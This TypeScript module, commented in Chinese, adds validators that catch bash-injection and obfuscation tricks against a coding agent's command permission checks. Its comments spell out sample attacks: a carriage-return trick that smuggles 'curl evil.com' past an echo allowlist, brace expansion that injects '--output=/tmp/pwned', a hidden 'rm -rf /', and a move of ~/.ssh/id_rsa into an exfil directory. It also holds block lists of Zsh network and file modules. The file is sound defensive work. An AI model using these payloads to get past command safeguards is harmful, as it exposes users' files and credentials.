/**
 * Bash 注入防护深化（对标 claude-code bashSecurity.ts）
 *
 * 背景：
 *   sid 原有的危险命令检测（checker.ts DANGEROUS_PATTERNS）只识别"危险命令名"
 *   （rm -rf /、fork bomb 等），无法防住"命令结构层面的注入/混淆绕过"——攻击者
 *   通过 IFS 替换、unicode 空白、CR 注入、ANSI-C 引号、brace 扩展、heredoc 替换等
 *   手段，让命令在"解析器看到的样子"和"bash 实际执行的样子"之间产生差异
 *   （parser differential），从而绕过基于正则/词法的安全检查。
 *
 * 本模块补齐这一层：一组**结构化校验器**，专门检测"会导致解析歧义/混淆"的命令
 *   构造。每个校验器是纯函数，返回命中的告警（或 null）。与"危险命令名"检测互补：
 *   - DANGEROUS_PATTERNS：命令"做什么"危险（语义层）
 *   - 本模块：命令"长什么样"可疑（结构层 / misparsing 层）
 *
 * 与 cc 的差异：
 *   cc 用 tree-sitter native parser 增强 2 个校验器（quote 上下文 / 复合结构）；
 *   sid 不引入 tree-sitter 原生依赖，全部用纯 TS 正则 + 状态机实现（cc 自身也保留了
 *   完整的非 tree-sitter 同步实现路径，本模块对标的就是那条路径）。
 *
 * 校验结果语义：
 *   - 命中 → 返回 { id, severity, message }；不命中 → null
 *   - severity="ask"：需用户确认（绝大多数 misparsing 都是 ask，因为可能是合法命令的
 *     罕见写法，交给用户判断）
 *   调用方（checker.ts）据此映射为 needsConfirmation 决策。
 */

/** 校验器命中结果 */
export interface InjectionFinding {
  /** 校验器标识（用于日志/审计/测试断言，避免日志泄漏完整命令） */
  id: string;
  /** 严重度：当前所有结构性 misparsing 都归为 "ask"（需确认） */
  severity: "ask";
  /** 人类可读的命中原因 */
  message: string;
}

/** 引号剥离的多种产物（对标 cc extractQuotedContent） */
interface QuoteExtraction {
  /** 保留双引号内内容、剥离单引号内内容 */
  withDoubleQuotes: string;
  /** 剥离所有引号内内容（单/双引号都剥离） */
  fullyUnquoted: string;
  /**
   * 像 fullyUnquoted 但保留引号定界符本身（' 和 "）。
   * 例：echo 'x'# → echo ''#（引号字符保留，暴露 # 与引号的相邻关系）。
   * 用于 mid-word hash 检测，避免剥离引号后丢失相邻信息。
   */
  unquotedKeepQuoteChars: string;
}

/**
 * 提取命令的引号上下文（纯字符状态机，对标 cc extractQuotedContent）。
 *
 * bash 引号规则：
 *   - 单引号内：一切字面，反斜杠不转义
 *   - 双引号内:反斜杠可转义部分字符
 *   - 单引号在双引号内不切换状态，反之亦然
 */
export function extractQuotedContent(command: string): QuoteExtraction {
  let withDoubleQuotes = "";
  let fullyUnquoted = "";
  let unquotedKeepQuoteChars = "";
  let inSingleQuote = false;
  let inDoubleQuote = false;
  let escaped = false;

  for (let i = 0; i < command.length; i++) {
    const char = command[i];

    if (escaped) {
      escaped = false;
      if (!inSingleQuote) withDoubleQuotes += char;
      if (!inSingleQuote && !inDoubleQuote) {
        fullyUnquoted += char;
        unquotedKeepQuoteChars += char;
      }
      continue;
    }

    // 反斜杠转义：单引号内反斜杠是字面，不触发转义
    if (char === "\\" && !inSingleQuote) {
      escaped = true;
      if (!inSingleQuote) withDoubleQuotes += char;
      if (!inSingleQuote && !inDoubleQuote) {
        fullyUnquoted += char;
        unquotedKeepQuoteChars += char;
      }
      continue;
    }

    // 单引号切换（双引号内不切换）
    if (char === "'" && !inDoubleQuote) {
      inSingleQuote = !inSingleQuote;
      unquotedKeepQuoteChars += char;
      continue;
    }

    // 双引号切换（单引号内不切换）
    if (char === '"' && !inSingleQuote) {
      inDoubleQuote = !inDoubleQuote;
      unquotedKeepQuoteChars += char;
      continue;
    }

    if (!inSingleQuote) withDoubleQuotes += char;
    if (!inSingleQuote && !inDoubleQuote) {
      fullyUnquoted += char;
      unquotedKeepQuoteChars += char;
    }
  }

  return { withDoubleQuotes, fullyUnquoted, unquotedKeepQuoteChars };
}

/**
 * 剥离"安全重定向"（2>&1、>/dev/null、</dev/null）。
 *
 * SECURITY: 三个模式都必须带尾边界 (?=\s|$)。否则 `> /dev/nullo` 会把 `/dev/null`
 *   当前缀匹配，剥离后剩 `o`，导致 `echo hi > /dev/nullo` 变成 `echo hi o`，
 *   重定向校验看不到 `>` 就放行了。
 */
function stripSafeRedirections(content: string): string {
  return content
    .replace(/\s+2\s*>&\s*1(?=\s|$)/g, "")
    .replace(/[012]?\s*>\s*\/dev\/null(?=\s|$)/g, "")
    .replace(/\s*<\s*\/dev\/null(?=\s|$)/g, "");
}

/**
 * 判断 content 中指定位置的字符是否被反斜杠转义。
 * 向前数连续反斜杠的个数：奇数个 → 被转义；偶数个 → 未被转义。
 */
function isEscapedAtPosition(content: string, pos: number): boolean {
  let backslashes = 0;
  let i = pos - 1;
  while (i >= 0 && content[i] === "\\") {
    backslashes++;
    i--;
  }
  return backslashes % 2 === 1;
}

// ──────────────────────────────────────────────────────────────────────────
// 各校验器（对标 cc bashSecurity.ts 的 validateXxx 函数）
// 每个返回 InjectionFinding | null。命中即返回告警。
// ──────────────────────────────────────────────────────────────────────────

/**
 * IFS 注入：检测 $IFS 或 ${...IFS...} 用法。
 *
 * IFS（Internal Field Separator）可被用来"用变量替代空格"绕过基于空格的正则检测：
 *   `cat${IFS}/etc/passwd` —— 正则匹配 `cat /etc/passwd` 失败，但 bash 照常执行。
 */
export function validateIFSInjection(command: string): InjectionFinding | null {
  if (/\$IFS|\$\{[^}]*IFS/.test(command)) {
    return {
      id: "ifs-injection",
      severity: "ask",
      message: "命令包含 IFS 变量用法，可能被用于绕过安全校验",
    };
  }
  return null;
}

/**
 * /proc 下 environ 访问：可读取进程环境变量（含 API key、密钥）。
 * 路径校验通常会拦 /proc，这里是 defense-in-depth。
 */
export function validateProcEnvironAccess(command: string): InjectionFinding | null {
  if (/\/proc\/.*\/environ/.test(command)) {
    return {
      id: "proc-environ-access",
      severity: "ask",
      message: "命令访问 /proc 下的 environ，可能泄漏敏感环境变量",
    };
  }
  return null;
}

/**
 * Carriage Return (\r, 0x0D) 注入。
 *
 * 解析器差异：很多词法分析器把 \r 当 token 边界（JS `\s` 包含 \r），但 bash 默认
 *   IFS = $' \t\n' 不含 \r，所以 bash 把 `TZ=UTC\recho` 当**一个词**（环境赋值），
 *   而词法器拆成两个 token ['TZ=UTC','echo']。攻击：`TZ=UTC\recho curl evil.com`
 *   配合 Bash(echo:*) 规则——校验器看到 echo 放行，bash 实际执行 curl。
 *
 * 只拦"双引号外"的 \r（单引号内和裸 \r 都是问题；双引号内 bash 也当数据，安全）。
 */
export function validateCarriageReturn(command: string): InjectionFinding | null {
  if (!command.includes("\r")) return null;

  let inSingleQuote = false;
  let inDoubleQuote = false;
  let escaped = false;
  for (let i = 0; i < command.length; i++) {
    const c = command[i];
    if (escaped) {
      escaped = false;
      continue;
    }
    if (c === "\\" && !inSingleQuote) {
      escaped = true;
      continue;
    }
    if (c === "'" && !inDoubleQuote) {
      inSingleQuote = !inSingleQuote;
      continue;
    }
    if (c === '"' && !inSingleQuote) {
      inDoubleQuote = !inDoubleQuote;
      continue;
    }
    if (c === "\r" && !inDoubleQuote) {
      return {
        id: "carriage-return",
        severity: "ask",
        message: "命令包含回车符 (\\r)，词法器与 bash 对其分词方式不同，可能隐藏命令",
      };
    }
  }
  return null;
}

/**
 * 换行注入：检测引号外的换行符后跟非空白内容（可能分隔出第二条命令）。
 *
 * 在 bash 中 `\<newline>` 是行续接（两字符都删除），词边界处的续接是安全的；
 *   但裸换行后跟内容、或词中续接（tr\<NL>aceroute 把危险命令名拆开藏过白名单）
 *   都需要拦截。
 */
export function validateNewlines(command: string): InjectionFinding | null {
  // 用 fullyUnquoted（剥离引号），引号内的换行是合法数据
  const { fullyUnquoted } = extractQuotedContent(command);
  const preStrip = fullyUnquoted;

  if (!/[\n\r]/.test(preStrip)) return null;

  // 命中：换行/回车后跟非空白，但排除"空白+反斜杠续接"这种安全形态
  const looksLikeCommand = /(?<![\s]\\)[\n\r]\s*\S/.test(preStrip);
  if (looksLikeCommand) {
    return {
      id: "newlines",
      severity: "ask",
      message: "命令包含换行符，可能分隔出多条命令",
    };
  }
  return null;
}

/**
 * Unicode 空白：bash 把它们当字面字符，词法器可能当词分隔符——制造解析差异。
 * 包括不间断空格、各种宽度空格、行/段分隔符、零宽 BOM 等。
 */
// eslint-disable-next-line no-misleading-character-class
const UNICODE_WS_RE = new RegExp("[\\u00A0\\u1680\\u2000-\\u200A\\u2028\\u2029\\u202F\\u205F\\u3000\\uFEFF]");

export function validateUnicodeWhitespace(command: string): InjectionFinding | null {
  if (UNICODE_WS_RE.test(command)) {
    return {
      id: "unicode-whitespace",
      severity: "ask",
      message: "命令包含 Unicode 空白字符，可能造成解析不一致",
    };
  }
  return null;
}

/**
 * 控制字符注入：除常规 \t\n\r 外的 ASCII 控制字符（0x00-0x1F、0x7F）。
 * 这些字符在终端/解析器/bash 之间行为不一致，常被用于混淆。
 */
// eslint-disable-next-line no-control-regex
const CONTROL_CHAR_RE = new RegExp("[\\x00-\\x08\\x0B\\x0C\\x0E-\\x1F\\x7F]");

export function validateControlCharacters(command: string): InjectionFinding | null {
  if (CONTROL_CHAR_RE.test(command)) {
    return {
      id: "control-characters",
      severity: "ask",
      message: "命令包含 ASCII 控制字符，可能被用于混淆解析",
    };
  }
  return null;
}

/**
 * 混淆 flag：检测各种用引号隐藏危险 flag 的手法（对标 cc validateObfuscatedFlags）。
 *
 * 攻击者用 ANSI-C 引号 $'...'、locale 引号 $"..."、空引号拼接 ''-exec、多重引号
 *   """-f" 等方式，把 `-exec`/`-f`/`--flag` 拆散藏过"危险 flag"的正则检测。
 *
 * echo 命令对混淆 flag 安全（但仅限无 shell 操作符的简单 echo）。
 */
export function validateObfuscatedFlags(command: string, baseCommand: string): InjectionFinding | null {
  // 简单 echo（无管道/分号/&）对混淆 flag 安全
  const hasShellOperators = /[|&;]/.test(command);
  if (baseCommand === "echo" && !hasShellOperators) {
    return null;
  }

  // 1. ANSI-C 引号 $'...' —— 可用转义序列编码任意字符（含零宽字符）
  if (/\$'[^']*'/.test(command)) {
    return {
      id: "obfuscated-flags",
      severity: "ask",
      message: "命令包含 ANSI-C 引号 ($'...')，可隐藏字符",
    };
  }

  // 2. locale 引号 $"..." —— 同样可用转义序列
  if (/\$"[^"]*"/.test(command)) {
    return {
      id: "obfuscated-flags",
      severity: "ask",
      message: "命令包含 locale 引号 ($\"...\")，可隐藏字符",
    };
  }

  // 3. 空 ANSI-C/locale 引号后跟 dash：$''-exec / $""-exec
  if (/\$['"]{2}\s*-/.test(command)) {
    return {
      id: "obfuscated-flags",
      severity: "ask",
      message: "命令包含空特殊引号后接 dash（疑似绕过）",
    };
  }

  // 4. 任意空引号序列后跟 dash：''-  ""-  ''""-  等
  if (/(?:^|\s)(?:''|"")+\s*-/.test(command)) {
    return {
      id: "obfuscated-flags",
      severity: "ask",
      message: "命令包含空引号后接 dash（疑似 flag 混淆）",
    };
  }

  // 4b. 同质空引号对紧邻"带引号的 dash"：'''-f"/ """-f" —— bash 拼接成 -f
  if (/(?:""|'')+['"]-/.test(command)) {
    return {
      id: "obfuscated-flags",
      severity: "ask",
      message: "命令包含空引号对紧邻带引号 dash（疑似 flag 混淆）",
    };
  }

  // 4c. 词首 3+ 连续引号字符（多重引号混淆的安全网）
  if (/(?:^|\s)['"]{3,}/.test(command)) {
    return {
      id: "obfuscated-flags",
      severity: "ask",
      message: "命令包含词首连续引号字符（疑似混淆）",
    };
  }

  // 5. 逐字符扫描：引号外的"空白 + 引号(含 dash 内容)"形态
  //    捕获 "-"exec、"-file"、'-'output 等被引号包住的 flag。
  let inSingleQuote = false;
  let inDoubleQuote = false;
  let escaped = false;

  for (let i = 0; i < command.length - 1; i++) {
    const currentChar = command[i];
    const nextChar = command[i + 1];

    if (escaped) {
      escaped = false;
      continue;
    }
    if (currentChar === "\\" && !inSingleQuote) {
      escaped = true;
      continue;
    }
    if (currentChar === "'" && !inDoubleQuote) {
      inSingleQuote = !inSingleQuote;
      continue;
    }
    if (currentChar === '"' && !inSingleQuote) {
      inDoubleQuote = !inDoubleQuote;
      continue;
    }
    if (inSingleQuote || inDoubleQuote) continue;

    // 空白后跟引号，且引号内内容以 dash 开头 → 疑似 flag 混淆
    if (currentChar && nextChar && /\s/.test(currentChar) && /['"`]/.test(nextChar)) {
      const quoteChar = nextChar;
      let j = i + 2;
      let insideQuote = "";
      while (j < command.length && command[j] !== quoteChar) {
        insideQuote += command[j];
        j++;
      }
      if (insideQuote.startsWith("-")) {
        return {
          id: "obfuscated-flags",
          severity: "ask",
          message: "命令包含带引号的 flag（疑似 flag 混淆）",
        };
      }
    }
  }

  return null;
}

/**
 * Brace 扩展混淆：检测 `{a,b}` / `{1..9}` 形态可能改变命令解析。
 *
 * 攻击：`git diff {@'{'0},--output=/tmp/pwned}` —— 引号内的 `{` 被当内容剥离，
 *   导致括号计数失配，brace 扩展出隐藏的 `--output=/tmp/pwned`，造成任意文件写入。
 *
 * 策略（对标 cc validateBraceExpansion）：
 *   a. fullyUnquoted 后统计未转义大括号，若 `}` 多于 `{` → 引号内 `{` 被剥离 → 拦
 *   b. 原始命令中"引号包单个大括号" + 存在未转义 `{` → 混淆原语 → 拦
 *   c. 深度匹配找配对大括号，外层有 `,` 或 `..` → brace 扩展 → 拦
 */
export function validateBraceExpansion(command: string): InjectionFinding | null {
  const { fullyUnquoted } = extractQuotedContent(command);
  const content = stripSafeRedirections(fullyUnquoted);

  // a. 统计未转义大括号
  let unescapedOpen = 0;
  let unescapedClose = 0;
  for (let i = 0; i < content.length; i++) {
    if (content[i] === "{" && !isEscapedAtPosition(content, i)) unescapedOpen++;
    else if (content[i] === "}" && !isEscapedAtPosition(content, i)) unescapedClose++;
  }
  if (unescapedOpen > 0 && unescapedClose > unescapedOpen) {
    return {
      id: "brace-expansion",
      severity: "ask",
      message: "命令在引号剥离后出现多余闭合大括号，疑似 brace 扩展混淆",
    };
  }

  // b. 引号包单个大括号 + 存在未转义 `{`
  if (unescapedOpen > 0 && /['"][{}]['"]/.test(command)) {
    return {
      id: "brace-expansion",
      severity: "ask",
      message: "命令在 brace 上下文中包含带引号的大括号字符（疑似 brace 扩展混淆）",
    };
  }

  // c. 深度匹配找配对，外层有 , 或 ..
  for (let i = 0; i < content.length; i++) {
    if (content[i] !== "{") continue;
    if (isEscapedAtPosition(content, i)) continue;

    let depth = 1;
    let matchingClose = -1;
    for (let j = i + 1; j < content.length; j++) {
      const ch = content[j];
      if (ch === "{" && !isEscapedAtPosition(content, j)) depth++;
      else if (ch === "}" && !isEscapedAtPosition(content, j)) {
        depth--;
        if (depth === 0) {
          matchingClose = j;
          break;
        }
      }
    }
    if (matchingClose === -1) continue;

    let innerDepth = 0;
    for (let k = i + 1; k < matchingClose; k++) {
      const ch = content[k];
      if (ch === "{" && !isEscapedAtPosition(content, k)) innerDepth++;
      else if (ch === "}" && !isEscapedAtPosition(content, k)) innerDepth--;
      else if (innerDepth === 0) {
        if (ch === "," || (ch === "." && k + 1 < matchingClose && content[k + 1] === ".")) {
          return {
            id: "brace-expansion",
            severity: "ask",
            message: "命令包含 brace 扩展，可能改变命令解析",
          };
        }
      }
    }
  }

  return null;
}

/**
 * Mid-word hash：检测非空白字符紧邻的 `#`（词中 #）。
 *
 * 词法器常把词中 `#` 当注释起点，但 bash 把它当字面字符——制造解析差异，
 *   可让词法器丢掉 `#` 之后的内容（路径提取/白名单匹配看不到危险参数）。
 *
 * 排除 ${# （bash 取字符串长度语法）。
 */
export function validateMidWordHash(command: string): InjectionFinding | null {
  const { unquotedKeepQuoteChars } = extractQuotedContent(command);

  // 同时检查"行续接合并后"的版本（词法器在合并后的文本上工作）
  const joined = unquotedKeepQuoteChars.replace(/\\+\n/g, (match) => {
    const backslashCount = match.length - 1;
    return backslashCount % 2 === 1 ? "\\".repeat(backslashCount - 1) : match;
  });

  if (/\S(?<!\$\{)#/.test(unquotedKeepQuoteChars) || /\S(?<!\$\{)#/.test(joined)) {
    return {
      id: "mid-word-hash",
      severity: "ask",
      message: "命令包含词中 #，词法器与 bash 解析方式不同",
    };
  }
  return null;
}

/**
 * 注释引号失谐（comment-quote desync）。
 *
 * bash 中未引号的 `#` 起注释，注释内的引号是字面字符。但很多引号追踪器不处理注释，
 *   注释内的 `'`/`"` 会错误切换引号状态，让后续行（含危险命令）看起来"在引号内"。
 *
 * 攻击：
 *   echo "it's" # ' " <<'MARKER'\n  rm -rf /\n  MARKER
 *   bash 中 `#` 起注释，第二行 `rm -rf /` 执行。
 *
 * 防御：未引号 `#` 后同一行内出现任意引号字符 → 视为 misparsing 拦截。
 */
export function validateCommentQuoteDesync(command: string): InjectionFinding | null {
  let inSingleQuote = false;
  let inDoubleQuote = false;
  let escaped = false;

  for (let i = 0; i < command.length; i++) {
    const char = command[i];

    if (escaped) {
      escaped = false;
      continue;
    }
    if (inSingleQuote) {
      if (char === "'") inSingleQuote = false;
      continue;
    }
    if (char === "\\") {
      escaped = true;
      continue;
    }
    if (inDoubleQuote) {
      if (char === '"') inDoubleQuote = false;
      continue;
    }
    if (char === "'") {
      inSingleQuote = true;
      continue;
    }
    if (char === '"') {
      inDoubleQuote = true;
      continue;
    }

    // 未引号 `#`：检查本行剩余部分是否含引号字符
    if (char === "#") {
      const lineEnd = command.indexOf("\n", i);
      const commentText = command.slice(i + 1, lineEnd === -1 ? command.length : lineEnd);
      if (/['"]/.test(commentText)) {
        return {
          id: "comment-quote-desync",
          severity: "ask",
          message: "命令的 # 注释内含引号字符，可能扰乱引号追踪",
        };
      }
      if (lineEnd === -1) break;
      i = lineEnd;
    }
  }
  return null;
}

/**
 * 引号内换行 + #-前缀行（quoted-newline）。
 *
 * bash 中引号内的 `\n` 是字面字符（参数的一部分）。但按行处理的注释剥离逻辑
 *   （split('\n') 后过滤 trim().startsWith('#') 的行）不追踪引号状态，引号内的换行
 *   让攻击者把下一行构造成 `#` 开头，导致该行被整行丢弃——隐藏敏感路径/参数。
 *
 * 攻击：`mv ./decoy '<\n>#' ~/.ssh/id_rsa ./exfil_dir`
 *   bash 移动 decoy 和 id_rsa；按行剥离把第二行（# 开头）丢掉 → 路径校验只看到 decoy。
 */
export function validateQuotedNewline(command: string): InjectionFinding | null {
  if (!command.includes("\n") || !command.includes("#")) return null;

  let inSingleQuote = false;
  let inDoubleQuote = false;
  let escaped = false;

  for (let i = 0; i < command.length; i++) {
    const char = command[i];

    if (escaped) {
      escaped = false;
      continue;
    }
    if (char === "\\" && !inSingleQuote) {
      escaped = true;
      continue;
    }
    if (char === "'" && !inDoubleQuote) {
      inSingleQuote = !inSingleQuote;
      continue;
    }
    if (char === '"' && !inSingleQuote) {
      inDoubleQuote = !inDoubleQuote;
      continue;
    }

    if (char === "\n" && (inSingleQuote || inDoubleQuote)) {
      const lineStart = i + 1;
      const nextNewline = command.indexOf("\n", lineStart);
      const lineEnd = nextNewline === -1 ? command.length : nextNewline;
      const nextLine = command.slice(lineStart, lineEnd);
      if (nextLine.trim().startsWith("#")) {
        return {
          id: "quoted-newline",
          severity: "ask",
          message: "命令包含引号内换行 + #-前缀行，可能向按行权限检查隐藏参数",
        };
      }
    }
  }
  return null;
}

/**
 * 命令替换 / 进程替换 / 参数展开（危险动态构造模式）。
 *
 * 检测各类会"在运行期动态生成命令文本"的构造（对标 cc COMMAND_SUBSTITUTION_PATTERNS）：
 *   $(...) / `...` / <(...) / >(...) / ${...} / $[...] 等。这些让静态检查无法预知
 *   实际执行内容。注意：sid 已有 DANGEROUS_PATTERNS "命令替换注入" 覆盖 `...`/$(...)，
 *   本校验器补齐 cc 列表里 sid 未覆盖的进程替换、Zsh =() 、$[] 等变体。
 */
const COMMAND_SUBSTITUTION_PATTERNS: Array<{ pattern: RegExp; message: string }> = [
  { pattern: /<\(/, message: "进程替换 <()" },
  { pattern: />\(/, message: "进程替换 >()" },
  { pattern: /=\(/, message: "Zsh 进程替换 =()" },
  // Zsh EQUALS 展开：词首 =cmd 展开为 $(which cmd)，绕过 base command 检测
  { pattern: /(?:^|[\s;&|])=[a-zA-Z_]/, message: "Zsh equals 展开 (=cmd)" },
  { pattern: /\$\[/, message: "$[] 旧式算术展开" },
  { pattern: /~\[/, message: "Zsh 风格参数展开" },
  { pattern: /\(e:/, message: "Zsh glob 限定符" },
  { pattern: /\}\s*always\s*\{/, message: "Zsh always 块 (try/always 构造)" },
  { pattern: /<#/, message: "PowerShell 注释语法（defense-in-depth）" },
];

export function validateProcessSubstitution(command: string): InjectionFinding | null {
  // 用 fullyUnquoted——引号内的这些字符是字面数据，安全
  const { fullyUnquoted } = extractQuotedContent(command);
  for (const { pattern, message } of COMMAND_SUBSTITUTION_PATTERNS) {
    if (pattern.test(fullyUnquoted)) {
      return {
        id: "command-substitution",
        severity: "ask",
        message: `命令包含${message}`,
      };
    }
  }
  return null;
}

/**
 * Zsh 危险命令：检测可绕过安全检查的 Zsh 模块/builtin（对标 cc ZSH_DANGEROUS_COMMANDS）。
 *
 * zmodload 是诸多模块攻击的入口（zsh/mapfile 隐形文件 IO、zsh/system 文件读写、
 *   zsh/zpty 伪终端执行、zsh/net/tcp 网络外传、zsh/files 绕过二进制检查的 rm/mv 等）。
 */
const ZSH_DANGEROUS_COMMANDS = new Set([
  "zmodload", "emulate",
  "sysopen", "sysread", "syswrite", "sysseek",
  "zpty", "ztcp", "zsocket", "mapfile",
  "zf_rm", "zf_mv", "zf_ln", "zf_chmod", "zf_chown",
  "zf_mkdir", "zf_rmdir", "zf_chgrp",
]);

const ZSH_PRECOMMAND_MODIFIERS = new Set(["command", "builtin", "noglob", "nocorrect"]);

export function validateZshDangerousCommands(command: string): InjectionFinding | null {
  const trimmed = command.trim();
  // 按空白拆 token，跳过环境赋值前缀和 Zsh precommand 修饰符，取真实 base command
  const tokens = trimmed.split(/\s+/);
  let idx = 0;
  // 跳过 VAR=val 前缀
  while (idx < tokens.length && /^[A-Za-z_]\w*=/.test(tokens[idx])) idx++;
  // 跳过 precommand 修饰符（command/builtin/...）
  while (idx < tokens.length && ZSH_PRECOMMAND_MODIFIERS.has(tokens[idx])) idx++;

  if (idx < tokens.length) {
    const base = tokens[idx];
    if (ZSH_DANGEROUS_COMMANDS.has(base)) {
      return {
        id: "zsh-dangerous-command",
        severity: "ask",
        message: `命令使用 Zsh 危险命令 (${base})，可绕过安全检查`,
      };
    }
    // fc -e：可在命令历史上执行任意编辑器
    if (base === "fc" && tokens.slice(idx + 1).some((t) => t === "-e")) {
      return {
        id: "zsh-dangerous-command",
        severity: "ask",
        message: "命令使用 fc -e，可执行任意编辑器",
      };
    }
  }
  return null;
}

/**
 * 反斜杠转义的操作符：检测 `\&&` `\;` `\|` 等被反斜杠转义的命令分隔符。
 *
 * 某些场景下反斜杠转义的操作符在词法器和 bash 之间解析不一致。注意 `find -exec \;`
 *   是合法常见用法——所以只在命令**已含真实操作符**（说明是复合命令）时才对转义操作符
 *   告警，避免误伤 find -exec。
 */
export function validateBackslashEscapedOperators(command: string): InjectionFinding | null {
  // 先判断是否存在真实（未转义）的命令分隔符
  const { fullyUnquoted } = extractQuotedContent(command);
  const hasRealOperator = /(?<!\\)(?:&&|\|\||;|\|)/.test(fullyUnquoted);
  if (!hasRealOperator) {
    // 无真实操作符：转义操作符多半是 find -exec \; 之类的合法参数，放行
    return null;
  }
  // 已是复合命令，又出现反斜杠转义操作符 → 解析歧义，拦
  if (/\\(?:&&|\|\||;|&|\|)/.test(command)) {
    return {
      id: "backslash-escaped-operator",
      severity: "ask",
      message: "复合命令中包含反斜杠转义的操作符，可能造成解析歧义",
    };
  }
  return null;
}

/**
 * heredoc-in-substitution：检测 $() 命令替换内嵌 heredoc 的危险构造。
 *
 * `$(...<<...)` 形态可隐藏注入的命令。cc 有一套精密的"安全 heredoc 早放行"逻辑
 *   （只放行 $(cat <<'EOF'...EOF) 这种可证明安全的形态），其余一律拦。
 *   本实现取保守策略：检测到 $() 内有 heredoc（`<<`）即告警，交给用户确认。
 */
export function validateHeredocInSubstitution(command: string): InjectionFinding | null {
  if (/\$\(.*<</s.test(command)) {
    return {
      id: "heredoc-in-substitution",
      severity: "ask",
      message: "命令在 $() 替换中嵌入 heredoc，可能隐藏注入命令",
    };
  }
  return null;
}

/**
 * 提取命令的 base command（首个非赋值、非包装词），用于 echo 豁免等判断。
 */
function extractBaseCommand(command: string): string {
  const trimmed = command.trim();
  const tokens = trimmed.split(/\s+/);
  let idx = 0;
  while (idx < tokens.length && /^[A-Za-z_]\w*=/.test(tokens[idx])) idx++;
  return idx < tokens.length ? tokens[idx] : "";
}

/**
 * 全部注入/混淆校验器（按从快到慢、从常见到罕见排序）。
 *
 * 返回首个命中的告警（短路）；全部不命中返回 null。
 *
 * 调用方应在"危险命令名检测之后、LLM 分类器之前"调用本函数——它是纯逻辑、零成本，
 *   能在 LLM 调用前先拦掉结构性注入，也为 LLM 不可用时提供结构层兜底。
 */
export function checkInjectionPatterns(command: string): InjectionFinding | null {
  if (!command || !command.trim()) return null;

  const baseCommand = extractBaseCommand(command);

  // 顺序：先跑零依赖的快速正则校验器，再跑需要引号提取的状态机校验器
  const validators: Array<() => InjectionFinding | null> = [
    () => validateControlCharacters(command),
    () => validateUnicodeWhitespace(command),
    () => validateCarriageReturn(command),
    () => validateIFSInjection(command),
    () => validateProcEnvironAccess(command),
    () => validateHeredocInSubstitution(command),
    () => validateProcessSubstitution(command),
    () => validateZshDangerousCommands(command),
    () => validateObfuscatedFlags(command, baseCommand),
    () => validateBraceExpansion(command),
    () => validateNewlines(command),
    () => validateMidWordHash(command),
    () => validateCommentQuoteDesync(command),
    () => validateQuotedNewline(command),
    () => validateBackslashEscapedOperators(command),
  ];

  for (const run of validators) {
    const finding = run();
    if (finding) return finding;
  }
  return null;
}
